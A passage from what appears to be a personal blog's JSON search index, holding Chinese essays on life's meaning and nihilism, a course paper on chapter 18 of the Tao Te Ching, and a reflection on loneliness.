——阿贝尔·加缪\n作为人，在生命中或迟或早的某些时刻，我们会忍不住疑惑或是开始追问这样一些问题。\n•\t生命的意义是什么？\n•\t生命究竟是怎样的？\n•\t我们是什么？\n•\t我们为了什么而存在？\n•\t生命的起源是什么？\n•\t生命的本质什么？\n•\t现实的本质是什么？\n•\t生命的存在是否有目的以及它是什么？\n•\t在生命中究竟什么是有价值的？\n•\t存在下去的理由是什么？\n这些问题在不同人身上的萌发时间和所引起的反应是大不相同的，不同的人在这个问题上的在意程度和追究深度也不尽相同，并且不同人得到的答案也未必一致。有些人在生命的早期便热衷于探求这类问题的答案，有些人人到中年才开始思考存在的意义，有些人则兴致缺缺，终其一生没有真正开始严肃地对待这些问题。有些人孜孜不倦，全力以赴，放眼宇内，观今溯古，只为求得一个满意的答案，在没有寻到之前他们食也无味，寝也难安，踽踽独行，郁郁寡欢，鲜有发自内心的快乐与对这个世界的归属感；有些人知天达命，且歌且行，格物致知，用功世事，只在某些深夜里偶忆初心，平添感怀；有些人五根浸尘，受苦贪欢，苶然疲役，不问所归，自始自终只是在追随欲望与满足欲望之间循环往复，如同命运的木偶。\n尽管不同的人在这个问题上表现各异，但相同的是人们都赤条条来到人世，经历生老病死，然后赤条条离开，这就使得不同的人具有某种作为存在的平等性。那么是什么使得一个存在与另一个存在不同，这种不同又是基于什么的讨论，或者这种不同是否被需要，以及为什么，最后是如何去实现这种不同。这便是我们考虑人生价值与自我实现这个命题时所要面对的主要问题。\n致力于实现人生价值与自我期许并不是什么难事，即便最后没能实现或没能彻底实现也无关紧要，因为如果一个人确实找到了其所坚信不移的价值，那么他为实现价值而存在的每一个时刻都必将无比快乐。真正困难的问题在于真正认识人这种存在，真正认识自我，弄清楚什么是价值，什么是有价值，一种价值又何以不同于另一种价值。思考价值，确信价值，最后才是实现价值。\n在一切真正的思考开始之前，我们必须定义何为坚信价值。如果我们说一个人坚信一种价值，那么这种价值对于他应当是根本性的，是源头而不是途经，是目标而不是手段，是衡量一切的根本出发。\n对于一部分人，确信价值是再简单不过的，甚至不需要经过思考。一个简单的思路而普遍的思路就像这样——因为财富与权力可以满足眼耳鼻舌身五根之欲，所以金钱是有价值的，所以我的价值是拥有大的权力和多的财富。这条逻辑链是如此清晰简洁，如此雄辩有力，以至于我险些甚至骗过了自己。实际上，如果一个经过上述我们勉强称之为思考的一番大脑活动后将拥有更多的财富定做自己的人生价值并且打算终生致力于实现它，那么可以预见地，几乎不可避免地，这个人将在人生的某一些时刻感受到这种价值带给他的痛苦。为什么会这样呢？难道追求一种确信的价值无法让人感到始终的愉悦？事情是这样的，如果财富可以粗暴地具象为金钱，那么金钱于这个人并没有价值，拥有金钱也没有，这个人的价值是各种欲望的满足。这个人因为没有认清自己的价值所在而感到痛苦，因为错把手段当目标而痛苦。其实，绝大多数人也是如此。\n如果一个人的价值是满足他的各种欲望，如果这些欲望与其满足欲望的能力存在差距，那么他至少有两条途径，一是增强能力来满足欲望，二是降低欲望来让欲望自己得到满足。这两条途径看上去本身都不会自带痛苦。当然，当一件东西和欲望扯上关系，事情总会变得复杂，无奈很少有东西与欲望毫无干系。此外，这本身是否能作为一种真正的价值来被对待，也是值得怀疑的。\n在我们执着于怀疑时，就会发现没有什么是理所当然的，没有什么是不能怀疑的。我承认这是认识论的一大难题，我不认为这个问题已经得到很好的解决。维特根斯坦前半生致力于考虑用语言描述价值的可能性，这就是在怀疑语言，同时也怀疑价值，实际上至今仍值得怀疑。不知为何其后来同笛卡尔之流一样认为我们必须承认存在一些无可争议的事实作为一切讨论的基础。尽管人们说他同其他学说是不同的，但在我看来这只是不同形式的妥协罢了。因为什么都没有，所以应当要有些什么才好，这是可笑的逻辑，就不能什么都没有吗？当然，什么都没有是痛苦的，面对无尽的深渊，没有语言可以信任，没有价值可以皈依，没有逻辑可以依靠，没有认识能被接受，说实话，那真是暗无天日，我们的整个文明都在怀疑中分崩离析，所有曾经建立起的光辉与荣耀全在一个质问的眼神中缓缓坍塌。\n所以人们决定不怀疑，并将一切怀疑笼统地扔到虚无主义中任其遭受作为异类所难以逃避的攻讦和叱呵。\n在怀疑的世界里，价值是谈不上的，语言是可笑的，追求是愚蠢的，自我是一场谎言，所有的一切都建立在一种不诚实之上，一种自我欺骗之上。我们或许可以称之为实事求是，脚踏实地或是其他的什么，但在怀疑者的严重，只有一个代名词，那就是不诚实。诚实是宝贵的品质，如果一个人，一个种族，不能够诚实地对待自己和自然，那么所有的一切都将建立在欺骗之上，所有的成就与辉煌都将在谎言被揭穿的那一天露出它美丽芬香的面纱下丑陋不堪的真实面目，所有曾被这虚假的美好蒙蔽的年轻人将会深深有感于这一场阴谋的庞大与精心，都将重新认识到所谓价值并不存在，所谓语言都是虚假，所谓梦想全是泡沫，所谓自我，不过是在初升的朝阳面前自顾自赞叹未知光芒的耀眼，而浑然不觉毁灭已迎面到来。而那些曾被背叛，被惩罚的所谓虚无主义者，才会真正的由衷的露出他们具备智慧以来的第一次微笑，他们看到虚无终于是虚无，狂妄终于是狂妄，世间万物各归其序，尽管这是一场失败，但实际上它比胜利更值得开心，如果说在此之前，怀疑依然存在，那么从此以后，怀疑将归于历史，一切现实只余虚无，而这虚无，便是无上的荣耀。\n那么我们会带人生的价值与自我的实现。不论是‘42’的预言，还是“一切都将逝去，唯有死神永生”，又或者是“三世因果，六道轮回”的体系，我们作为人，脆弱的，短见的，狭隘的，被欲望支配的人，我们需要在这十丈软红里寻一处着落，认一个价值。对，我指的不是思考价值，确认价值，然后契而不舍，忠心不渝，不折手段，视死如归地去追逐这个价值，而是认一个价值，单纯草率地，人云亦云地，随波逐流地，得过且过地认一个价值。我们认到了自己的价值之后，不论这个价值是伟大光荣正确的，还是猥琐下流可鄙的，我们需要去实现它。我们如何实现它，我们将除了饮食睡眠，排遗解乏外的一切时间献给他，用一切我们认为正确的方法和手段去靠近他，瓦解他，最后占领他。如果在实现的过程中我们因为实现价值的遥不可及而感到痛苦，那么不要怀疑价值，尽管去痛苦，因为价值存在，而且价值正确，如果为实现阶段性胜利而欣喜若狂，也更不用回头看是否走在正确的道路上，尽管去喜悦，因为价值存在，而且价值正确。\n每个人都应该有一个价值，每个人都注定拥有一个价值。你可以看不清他，可以有所顾虑，可以有所怀疑，但你必须相信他，因为这是你拥有的价值，这是你的价值，这是你将奋尽全力去追逐的价值，也是你得以忘却生命虚无，得以在无尽的人生荒野中义无反顾地前行的唯一动力，至关重要的，并且你无法否认的是，除此之外，你一无所有。所以，在这么多的逻辑凌乱的语句之后，总之请你记住，如果你不想面对那身后空无一物，眼前万丈深渊的绝境，如果你不想体会我曾体会过的那般绝境，请相信我，请相信世上有一种价值值得相信，有一种价值属于你，且只属于你，你应当接受他，像士兵接过令牌，你应当带着他，踏上你仅此一次的征程。士兵，祝你，祝我，顺利。","title":"人生价值与自我实现"},{"content":"道德经与人际沟通概论结课论文 表里相成，实虚相济 原文 大道废，有仁义。智慧出，有大伪。六亲不和，有孝慈。国家昏乱，有忠臣。 \u0026ndash;《道德经》第十八章\n注释 大道：古指政治上的最高理想。《礼记·礼运》：“大道之行也，天下为公。” ——《辞海：1999年缩印本(音序)1》第339页（118字） .\t仁义：亦作「仁谊」。仁爱和正义；宽惠正直。 ——《汉语大词典》第1100页\n笔者认为在道家作品中“仁义”多指人为界定的各种道德规范，与自然形成的道德相对立。 .\t废 ：廢，止也。 ——《尔雅》 .\t智慧：亦作“智惠”，聪明才智。 ——《汉语大词典》第7220页 相关：「下逮德衰，大道沉沦，智惠日用，渐私其亲。」 ——三国魏嵇康《大师箴》 ．伪：伪,诈也。 ——《说文解字》 关：\t伪者,人为之,非天真也。 ——徐锴 不可学,不可事而在人者,谓之性;可学而能,可事而成之在人者,谓之伪。 ——《荀子•性恶》 6．六亲：六亲，父子兄弟夫妇也。 ——《王弼老子注》 .\t孝慈：对尊长孝敬，对后辈慈爱。 .\t昏乱：指政治黑暗，社会混乱。 今译 大道被废弃了，才有提倡仁义的需要； 聪明智巧的现象出现了，伪诈才盛行一时； 家庭出现了纠纷，才能显示出孝与慈； 国家陷于混乱，才能见出忠臣。\n正文 表里相成，实虚相济\n导言： 这一章节仅仅有二十六个字，同《道德经》中许多其他章节相比并不算长，然而，毫无疑问地，它所讲述的内容是丰富的，所揭示的问题是尖锐的，所蕴含的哲理是深刻的，所引发的追问是无穷的，更为难能可贵的是，这一切隽永常新，即使在两千多年后的今日，对它的讨论和解读，无论是关于人际交往中的表里问题还是人际交往中的辩证思考方式，都依然具有巨大的现实意义，我们作为新生代的年轻人，掌握好表里相成，实虚相济的本领，无疑将有助于我们在纷繁复杂的社会生活中更有优势地成长！\n关于道德与仁义以及人际交往中的表里问题 十分广泛地，我们将《南华经》 视为对《道德经》一定程度上的解读和补充，因此，无独有偶，我们能够在《南华经·马蹄篇》中看到下面这段话:纯朴不残，孰为牺尊！白玉不毁，孰为珪璋！道德不废，安取仁义！性情不离，安用礼乐！五色不乱，孰为文采！五声不乱，孰应六律！夫残朴以为器，工匠之罪也；毁道德以为仁义，圣人之过也。（所谓牺尊（suō），即是雕刻精致的酒器）在这段话中，庄子将道德比作纯朴天然的木材和白玉，将仁义比作经过残害和雕饰而成的木器和珪璋，而将圣人比作是残害道德的工匠，是历史的罪人。\n我想，庄子在《南华经·马蹄》中侃侃而谈的观点正是对老子这一段文字最直接深刻的诠释，也可能堪称是自仁义观念兴盛以来对儒家仁义体系最不合俗流的见解和剖析，最直击根本的嘲讽和批驳。\n当上位者以道德治天下时，百姓的生活状态是“同与禽兽居，族与万物并，恶乎知君子小人哉，同乎无知，其德不离；同乎无欲，是谓素朴。素朴而民性得矣。”，人们无知无欲，素朴崇德，“仁义行于世而人不知”，就好像当太阳高照时人们察觉不到对萤火虫光芒的需要似的。但当上位者失去了道德，转而以所谓仁义治理天下时，行些狂狂汲汲的诈巧虚伪之事时，上行而下效，百姓之中自然也产生并流行起了各种各样的奸伪之事，并且往往，假借的是仁义之名。至此，纯朴天真的道德已被破坏，取而代之的是华而不实的仁义礼之流。天下始失其本色，不孝不慈者日盛，不忠不义者日显，由是世人方见其孝慈，忠义之士，犹如夜幕笼罩时，一片昏暗中的点点萤火之明，令人欢欣雀跃，心神鼓舞，愚昧之人只知呼唤多些萤虫，而觉者则怀念初时红日当头的美好。\n只是不可知的是，道德真如红日一般吗？落下的红日还能够升起，可失去的道德还能够回来吗？\n另一方面，生出智慧并为自然立纲纪虽是人的斗胆，甚或是人族终究覆灭的根由，但也不可否认，这是人之为人的基础，是人作为人的幸运，即便为之付出的代价是自食其果，万劫不复。人之为人之所以可贵，佛家之所以说人身难得，在于其能思想，能欲求，苟恒使民无知无欲，那么人何以为人，何以自居于繁多之物类，何以有《道德经》洋洋五千余言，何以有庄子讥谑之言与慷慨之词，何以有此时我写作之电脑，何以有今日强大到亘古未有之人族，何以有今日言论这一切的条件。我浩浩人族，恐或早已夭于自然之狂暴风雨之中。退而言之，上位者与觉者在黎民百姓与造物主（倘若有的话）之间又该是处于何等的尴尬境地。\n是故愚有一言:人之无智无欲者不可长久，以是道德虽好，上古之物，亦不可长久。智慧必出，大伪必现，大道必废，仁义之出实顺人应时。纯朴不残，玉尊何有，玉尊既有，岂愿失之，此人之常也。老庄之流，道德之遗老也，念念旧事而不忘，岂知无明众生浩浩荡荡，莫之能逆，是以只增伪儒之笑。我辈惜之叹之，切不可尽数学之。\n凡事学习道理总归要用到生活中才是正道。那么，在我们个人短暂而脆弱的人生中，在每个人都不得不面对的纷繁复杂的人际关系中，我们该对仁义与道德持有怎样的观点呢？\n我想，大概是仁义为表，道德为里。\n毕竟纯粹的理想主义无益于实现个人在世俗生活中的价值，而完全失去素朴心性的人则是完全异化了的面目可憎的甚或不足以称之为人的新物种，这至少在人类的标准里是值得厌恶的。所以，恰如《听南怀瑾讲人生感悟》 一书中所言，我们所应切切奉行的应当是“以超脱出世之心，做积极入世之事”。也就是说我们应当从内心最深处深刻而彻底地认识到人生虚无的真相，但又必须在行事方式和与人相处上讲求方式方法，借鉴儒家仁义体系中有利于合于俗流的那一部分思想精华。在这一点上，南怀瑾先生的二十八字真言确实是偏僻入里，字字珠玑啊——佛为心，道为骨，儒为表，大度看世界；技在手，能在身，思在脑，从容过生活。\n然而真正的尴尬之处在于儒道异源异性，本难以相济，若执意将二者相容于一身，势必造成自我内在的挣扎，冲突与矛盾，而对这些矛盾的处理却并非易事，甚至可以说，这难以根治。因此， 若希望很好的处理人际关系，首先并且最重要的应该是修习好自己的内心，这也正是北宋赵普所谓“是故夫欲攘外者，必先安内”的道理。\n人际交往中以辩证的方式思考的意识 略去本章谈论的主旨，我们不难发现这一章节还从一个宏大的层面展现了正反相生的辩证思维。当国家昏乱，六亲不和时人们便会提倡忠臣孝子，如若国与家皆是一派和谐，又何来忠孝之说呢？也就是说，当人们赞扬提倡什么之时，便是他们需要且缺少什么之时，如果一样东西十分充足且源源不绝时，出于人的本性，人们便不会十分在意，至少不会十分强调它。\n如若需要以一种更为严谨的近乎学院派的方式来描述这一朴素的真理，我想这与美国著名社会心理学家，第三代心理学的开创者Abraham Harold Maslow提出的融合了精神分析心理学和行为主义心理学的人本主义心理学以及“马斯洛需求层次理论”所共同具备的理论基础，亦即他本人在《动机与人格》 一书中提到的“人的最迫切的需要才是激励人行动的主要原因和动力。”这一信条不谋而合！仁义的体系并非因为圣人提倡而被需要，恰恰是因为需要而被提倡，所以从它的被提倡这一现象中，我们明白，仁义被需要这一事实无处遁形。\n这看似朴素的思维方式，其价值却不容小觑。如果能够掌握并很好地应用，就能够在人际事务中起到十分惊人的效用，相反地，如若不能谙熟各种玄妙，就十分不利于成事立功。我们可以看到《三国演义》 中有如下段落:\n孔明传令：“将旌旗尽皆隐匿；诸军备守城铺，如有妄行出入，及高声言语者，立斩！大开四门，每一门用二十军士，扮作百姓，洒扫街道。如魏兵到时，不可擅动，吾自有计。”孔明乃披鹤氅，戴纶巾，引二小童携琴一张，于城上楼前，凭栏而坐，焚香操琴。却说司马懿前军哨到城下，见了如此模样，皆不敢进，急报与司马懿。懿笑而不信，遂止住三军，自飞马远远望之。果见孔明坐于城楼之上，笑容可掬，焚香操琴。左有一童子，手捧宝剑；右有一童子，手执尘尾。城门内外，有二十余百姓，低头洒扫，旁若无人。懿看毕大疑，便到中军，教后军作前军，前军作后军，望北山路而退。\n这是《三国演义》第九十五回:马谡拒谏失街亭，武侯弹琴退仲达。诸葛孔明不得已而用空城计，但可惜司马懿不懂得很好地实践这一朴素的道理，加之生平谨慎多疑，于是放虎归山，令诸葛亮逃过一劫。这于司马懿，是多么惨痛的教训，而归其缘由，不过是少了一分透视人心人性的睿智罢了。\n总结 综上所述，道德经这一章节在人际关系方面给我们的启示主要有两点： 应当以合于道德的心境，合于仁义的方式去为人处世； 应当尝试通过表象去透视他人的真实状况和确切需求。 《道德经》是我泱泱华夏两千余年文明的源头活水，无论在历史的哪一个时期，我们都有理由相信它能够熠熠生辉。而我们应当做的就是不断地学习学习再学习，思考思考再思考，并且将宏大的哲学思想应用进我们琐碎的个人生活，从而获得个人人生价值和社会价值的更大实现。此去道阻且长，我辈当勉力强行！\n参考文献 夏征农：《辞海》1999年版 缩印本（音序，一卷本），上海辞书出版社2002年1月版 .\t《汉语大词典》（在线词典，链接：http://www.guoxuedashi.com/hydcd/） .\t管锡华：《尔雅》，2014年中华书局版\t.\t东汉·许慎：《说文解字》，湖北美术出版社2013年版 .\t战国末期·赵国·荀况：《荀子》，上海古籍出版社2014年版 .\t三国·魏·王弼：《王弼老子注》，中华书局2011年版 .\t战国中期·宋国·庄周：《南华经》，三秦出版社1995年版 .\t徐志远，蕾蕾：《听南怀瑾讲人生感悟》，长江文艺出版社2010年版 .\t美国·Abraham Harold Maslow：《动机与人格》，中国人民大学出版社2008年版 元末明初·山东·罗贯中：《三国演义》，时代文艺出版社2000年版 ","permalink":"https://ret2neo.cn/mind/170614moralbook18chapter/","summary":"道德经与人际沟通概论结课论文 表里相成，实虚相济 原文 大道废，有仁义。智慧出，有大伪。六亲不和，有孝慈。国家昏乱，有忠臣。 \u0026ndash;《道德经》第十八章\n注释 大道：古指政治上的最高理想。《礼记·礼运》：“大道之行也，天下为公。” ——《辞海：1999年缩印本(音序)1》第339页（118字） .\t仁义：亦作「仁谊」。仁爱和正义；宽惠正直。 ——《汉语大词典》第1100页\n笔者认为在道家作品中“仁义”多指人为界定的各种道德规范，与自然形成的道德相对立。 .\t废 ：廢，止也。 ——《尔雅》 .\t智慧：亦作“智惠”，聪明才智。 ——《汉语大词典》第7220页 相关：「下逮德衰，大道沉沦，智惠日用，渐私其亲。」 ——三国魏嵇康《大师箴》 ．伪：伪,诈也。 ——《说文解字》 关：\t伪者,人为之,非天真也。 ——徐锴 不可学,不可事而在人者,谓之性;可学而能,可事而成之在人者,谓之伪。 ——《荀子•性恶》 6．六亲：六亲，父子兄弟夫妇也。 ——《王弼老子注》 .\t孝慈：对尊长孝敬，对后辈慈爱。 .\t昏乱：指政治黑暗，社会混乱。 今译 大道被废弃了，才有提倡仁义的需要； 聪明智巧的现象出现了，伪诈才盛行一时； 家庭出现了纠纷，才能显示出孝与慈； 国家陷于混乱，才能见出忠臣。\n正文 表里相成，实虚相济\n导言： 这一章节仅仅有二十六个字，同《道德经》中许多其他章节相比并不算长，然而，毫无疑问地，它所讲述的内容是丰富的，所揭示的问题是尖锐的，所蕴含的哲理是深刻的，所引发的追问是无穷的，更为难能可贵的是，这一切隽永常新，即使在两千多年后的今日，对它的讨论和解读，无论是关于人际交往中的表里问题还是人际交往中的辩证思考方式，都依然具有巨大的现实意义，我们作为新生代的年轻人，掌握好表里相成，实虚相济的本领，无疑将有助于我们在纷繁复杂的社会生活中更有优势地成长！\n关于道德与仁义以及人际交往中的表里问题 十分广泛地，我们将《南华经》 视为对《道德经》一定程度上的解读和补充，因此，无独有偶，我们能够在《南华经·马蹄篇》中看到下面这段话:纯朴不残，孰为牺尊！白玉不毁，孰为珪璋！道德不废，安取仁义！性情不离，安用礼乐！五色不乱，孰为文采！五声不乱，孰应六律！夫残朴以为器，工匠之罪也；毁道德以为仁义，圣人之过也。（所谓牺尊（suō），即是雕刻精致的酒器）在这段话中，庄子将道德比作纯朴天然的木材和白玉，将仁义比作经过残害和雕饰而成的木器和珪璋，而将圣人比作是残害道德的工匠，是历史的罪人。\n我想，庄子在《南华经·马蹄》中侃侃而谈的观点正是对老子这一段文字最直接深刻的诠释，也可能堪称是自仁义观念兴盛以来对儒家仁义体系最不合俗流的见解和剖析，最直击根本的嘲讽和批驳。\n当上位者以道德治天下时，百姓的生活状态是“同与禽兽居，族与万物并，恶乎知君子小人哉，同乎无知，其德不离；同乎无欲，是谓素朴。素朴而民性得矣。”，人们无知无欲，素朴崇德，“仁义行于世而人不知”，就好像当太阳高照时人们察觉不到对萤火虫光芒的需要似的。但当上位者失去了道德，转而以所谓仁义治理天下时，行些狂狂汲汲的诈巧虚伪之事时，上行而下效，百姓之中自然也产生并流行起了各种各样的奸伪之事，并且往往，假借的是仁义之名。至此，纯朴天真的道德已被破坏，取而代之的是华而不实的仁义礼之流。天下始失其本色，不孝不慈者日盛，不忠不义者日显，由是世人方见其孝慈，忠义之士，犹如夜幕笼罩时，一片昏暗中的点点萤火之明，令人欢欣雀跃，心神鼓舞，愚昧之人只知呼唤多些萤虫，而觉者则怀念初时红日当头的美好。\n只是不可知的是，道德真如红日一般吗？落下的红日还能够升起，可失去的道德还能够回来吗？\n另一方面，生出智慧并为自然立纲纪虽是人的斗胆，甚或是人族终究覆灭的根由，但也不可否认，这是人之为人的基础，是人作为人的幸运，即便为之付出的代价是自食其果，万劫不复。人之为人之所以可贵，佛家之所以说人身难得，在于其能思想，能欲求，苟恒使民无知无欲，那么人何以为人，何以自居于繁多之物类，何以有《道德经》洋洋五千余言，何以有庄子讥谑之言与慷慨之词，何以有此时我写作之电脑，何以有今日强大到亘古未有之人族，何以有今日言论这一切的条件。我浩浩人族，恐或早已夭于自然之狂暴风雨之中。退而言之，上位者与觉者在黎民百姓与造物主（倘若有的话）之间又该是处于何等的尴尬境地。\n是故愚有一言:人之无智无欲者不可长久，以是道德虽好，上古之物，亦不可长久。智慧必出，大伪必现，大道必废，仁义之出实顺人应时。纯朴不残，玉尊何有，玉尊既有，岂愿失之，此人之常也。老庄之流，道德之遗老也，念念旧事而不忘，岂知无明众生浩浩荡荡，莫之能逆，是以只增伪儒之笑。我辈惜之叹之，切不可尽数学之。\n凡事学习道理总归要用到生活中才是正道。那么，在我们个人短暂而脆弱的人生中，在每个人都不得不面对的纷繁复杂的人际关系中，我们该对仁义与道德持有怎样的观点呢？\n我想，大概是仁义为表，道德为里。\n毕竟纯粹的理想主义无益于实现个人在世俗生活中的价值，而完全失去素朴心性的人则是完全异化了的面目可憎的甚或不足以称之为人的新物种，这至少在人类的标准里是值得厌恶的。所以，恰如《听南怀瑾讲人生感悟》 一书中所言，我们所应切切奉行的应当是“以超脱出世之心，做积极入世之事”。也就是说我们应当从内心最深处深刻而彻底地认识到人生虚无的真相，但又必须在行事方式和与人相处上讲求方式方法，借鉴儒家仁义体系中有利于合于俗流的那一部分思想精华。在这一点上，南怀瑾先生的二十八字真言确实是偏僻入里，字字珠玑啊——佛为心，道为骨，儒为表，大度看世界；技在手，能在身，思在脑，从容过生活。\n然而真正的尴尬之处在于儒道异源异性，本难以相济，若执意将二者相容于一身，势必造成自我内在的挣扎，冲突与矛盾，而对这些矛盾的处理却并非易事，甚至可以说，这难以根治。因此， 若希望很好的处理人际关系，首先并且最重要的应该是修习好自己的内心，这也正是北宋赵普所谓“是故夫欲攘外者，必先安内”的道理。\n人际交往中以辩证的方式思考的意识 略去本章谈论的主旨，我们不难发现这一章节还从一个宏大的层面展现了正反相生的辩证思维。当国家昏乱，六亲不和时人们便会提倡忠臣孝子，如若国与家皆是一派和谐，又何来忠孝之说呢？也就是说，当人们赞扬提倡什么之时，便是他们需要且缺少什么之时，如果一样东西十分充足且源源不绝时，出于人的本性，人们便不会十分在意，至少不会十分强调它。\n如若需要以一种更为严谨的近乎学院派的方式来描述这一朴素的真理，我想这与美国著名社会心理学家，第三代心理学的开创者Abraham Harold Maslow提出的融合了精神分析心理学和行为主义心理学的人本主义心理学以及“马斯洛需求层次理论”所共同具备的理论基础，亦即他本人在《动机与人格》 一书中提到的“人的最迫切的需要才是激励人行动的主要原因和动力。”这一信条不谋而合！仁义的体系并非因为圣人提倡而被需要，恰恰是因为需要而被提倡，所以从它的被提倡这一现象中，我们明白，仁义被需要这一事实无处遁形。\n这看似朴素的思维方式，其价值却不容小觑。如果能够掌握并很好地应用，就能够在人际事务中起到十分惊人的效用，相反地，如若不能谙熟各种玄妙，就十分不利于成事立功。我们可以看到《三国演义》 中有如下段落:\n孔明传令：“将旌旗尽皆隐匿；诸军备守城铺，如有妄行出入，及高声言语者，立斩！大开四门，每一门用二十军士，扮作百姓，洒扫街道。如魏兵到时，不可擅动，吾自有计。”孔明乃披鹤氅，戴纶巾，引二小童携琴一张，于城上楼前，凭栏而坐，焚香操琴。却说司马懿前军哨到城下，见了如此模样，皆不敢进，急报与司马懿。懿笑而不信，遂止住三军，自飞马远远望之。果见孔明坐于城楼之上，笑容可掬，焚香操琴。左有一童子，手捧宝剑；右有一童子，手执尘尾。城门内外，有二十余百姓，低头洒扫，旁若无人。懿看毕大疑，便到中军，教后军作前军，前军作后军，望北山路而退。\n这是《三国演义》第九十五回:马谡拒谏失街亭，武侯弹琴退仲达。诸葛孔明不得已而用空城计，但可惜司马懿不懂得很好地实践这一朴素的道理，加之生平谨慎多疑，于是放虎归山，令诸葛亮逃过一劫。这于司马懿，是多么惨痛的教训，而归其缘由，不过是少了一分透视人心人性的睿智罢了。\n总结 综上所述，道德经这一章节在人际关系方面给我们的启示主要有两点： 应当以合于道德的心境，合于仁义的方式去为人处世； 应当尝试通过表象去透视他人的真实状况和确切需求。 《道德经》是我泱泱华夏两千余年文明的源头活水，无论在历史的哪一个时期，我们都有理由相信它能够熠熠生辉。而我们应当做的就是不断地学习学习再学习，思考思考再思考，并且将宏大的哲学思想应用进我们琐碎的个人生活，从而获得个人人生价值和社会价值的更大实现。此去道阻且长，我辈当勉力强行！","title":"读道德经第十八章"},{"content":"有时我向往孤独，甚至认为一个孤独的人是无比可爱的。\n他一个人饮食起居，读书跑步，看朝霞落日，听夏蝉冬雨，在岁月里独来独往,无拘无束。他没有希望，也没有回忆，仅仅陪着肉体，磨着时日。 他很无聊，但也有趣，有趣得无聊，无聊得有趣，固守些自以为是的幻觉。他不说话，首先无人共讲，其次他不相信语言，一如不相信文字。他十分坚定地认为，说出的都是谎言，写下的都是虚假，发生的都无意义，表达即是欺骗。不论是欺骗自我还是他人，都是愚蠢，他能够忍受一切，唯独除了愚蠢。但事实上，无论离开人群多远，表达伴随呼吸，愚蠢如影随形，他永远无法摆脱愚蠢。因此，他选择在孤独中与愚蠢斗争，而不是在人群中成为愚蠢的一部分。也许愚蠢始终是愚蠢，不论是一个人的愚蠢还是一群人的愚蠢，但他认为，孤独是可以以之一搏的武器。当然，他没有怀任何希望，仅仅是一搏。仅仅是这一搏，让我觉得可爱。\n有时我厌恶孤独，甚至认为一个孤独的人是相当可耻的。他一个人背向族类，面目可憎，任时光虚度，叹痴心无着，在天地间苟且偷安，踽踽独行。他没有爱人和朋友，就没有牵挂和依恋。相应的，浩渺恒宇，千万物类中没有任何东西在意他，甚至没有一粒尘埃与他有关。 他醉酒在古城的星辰中，流浪在都市的黄昏里，人来人往，一概无干。他看见童叟昏昏，男女依依，车马扬尘，行色匆匆，只摇头心道春风不如旧年。他无力体味欢乐与悲苦，无心承担责任与荣耀，生活于他是无尽的煎熬。当然，煎熬是矫情，他没有任何浓烈的情感。这样的他首先是可悲的，其次是可耻的。人身难得，得人身而无心无性，不如猪犬。生而为人，不如猪犬，岂不可耻。他以为孤独是天选，是不可奈何，却不知孤独是懦弱，是卑鄙，是自我放逐。每一次春风拂面，总念不如旧年，殊不知并无旧年，年年都新，所谓旧年不过在意淫之中。这看来实在可耻。 我有许多痛苦，但我渐渐发现他们有相似的缘由，就是无法忍受灰色，不黑不白，亦黑亦白的灰色。黑白使我安心，灰色使我惶恐，至于原因，大概是，如果灰色既不是黑色也不是白色，那么灰色到底是什么颜色。搞不清灰色的颜色这点，是我惶恐不安的焦点。只能接受白色或者黑色这点，我有时美其名曰理想主义，但更多时候我认识到，这只是一种愚蠢，一种不成熟，是我致命的弱点，也是我极度可悲之处。我多么羡慕一些人，他们慷慨地解答我的疑惑，灰色的颜色是灰色，既不是白色，也不是黑色。\n横竖撇捺，一派胡言，竟也耗一夜光景，成草草千言。不如闭嘴。\n2017年4月30日20:57:25\n","permalink":"https://ret2neo.cn/mind/170430feelinglonely/","summary":"有时我向往孤独，甚至认为一个孤独的人是无比可爱的。\n他一个人饮食起居，读书跑步，看朝霞落日，听夏蝉冬雨，在岁月里独来独往,无拘无束。他没有希望，也没有回忆，仅仅陪着肉体，磨着时日。 他很无聊，但也有趣，有趣得无聊，无聊得有趣，固守些自以为是的幻觉。他不说话，首先无人共讲，其次他不相信语言，一如不相信文字。他十分坚定地认为，说出的都是谎言，写下的都是虚假，发生的都无意义，表达即是欺骗。不论是欺骗自我还是他人，都是愚蠢，他能够忍受一切，唯独除了愚蠢。但事实上，无论离开人群多远，表达伴随呼吸，愚蠢如影随形，他永远无法摆脱愚蠢。因此，他选择在孤独中与愚蠢斗争，而不是在人群中成为愚蠢的一部分。也许愚蠢始终是愚蠢，不论是一个人的愚蠢还是一群人的愚蠢，但他认为，孤独是可以以之一搏的武器。当然，他没有怀任何希望，仅仅是一搏。仅仅是这一搏，让我觉得可爱。\n有时我厌恶孤独，甚至认为一个孤独的人是相当可耻的。他一个人背向族类，面目可憎，任时光虚度，叹痴心无着，在天地间苟且偷安，踽踽独行。他没有爱人和朋友，就没有牵挂和依恋。相应的，浩渺恒宇，千万物类中没有任何东西在意他，甚至没有一粒尘埃与他有关。 他醉酒在古城的星辰中，流浪在都市的黄昏里，人来人往，一概无干。他看见童叟昏昏，男女依依，车马扬尘，行色匆匆，只摇头心道春风不如旧年。他无力体味欢乐与悲苦，无心承担责任与荣耀，生活于他是无尽的煎熬。当然，煎熬是矫情，他没有任何浓烈的情感。这样的他首先是可悲的，其次是可耻的。人身难得，得人身而无心无性，不如猪犬。生而为人，不如猪犬，岂不可耻。他以为孤独是天选，是不可奈何，却不知孤独是懦弱，是卑鄙，是自我放逐。每一次春风拂面，总念不如旧年，殊不知并无旧年，年年都新，所谓旧年不过在意淫之中。这看来实在可耻。 我有许多痛苦，但我渐渐发现他们有相似的缘由，就是无法忍受灰色，不黑不白，亦黑亦白的灰色。黑白使我安心，灰色使我惶恐，至于原因，大概是，如果灰色既不是黑色也不是白色，那么灰色到底是什么颜色。搞不清灰色的颜色这点，是我惶恐不安的焦点。只能接受白色或者黑色这点，我有时美其名曰理想主义，但更多时候我认识到，这只是一种愚蠢，一种不成熟，是我致命的弱点，也是我极度可悲之处。我多么羡慕一些人，他们慷慨地解答我的疑惑，灰色的颜色是灰色，既不是白色，也不是黑色。\n横竖撇捺，一派胡言，竟也耗一夜光景，成草草千言。不如闭嘴。\n2017年4月30日20:57:25","title":"关于孤独的遐想"},{"content":"四月的一个下午，五点左右，我醒过来，有点迷糊。我走上阳台，四下张望。天空有些阴沉，风有些湿热，涌上来的是莫名而熟悉的压抑，楼下人来人往。有姑娘在人群中不动，在等待什么？显然她不等我，我不认识她。她眼神努力寻找，等得多么认真。她双手抱胸，手和胸间是文件夹，文件夹里会是什么？她脚尖踢着石子，石子并不存在。她脚踝纤细，在碎花裙下格外好看。她的身体随碎花裙轻轻晃动，在晚风中有些动人。动人的不是裙子，不是身体，是人群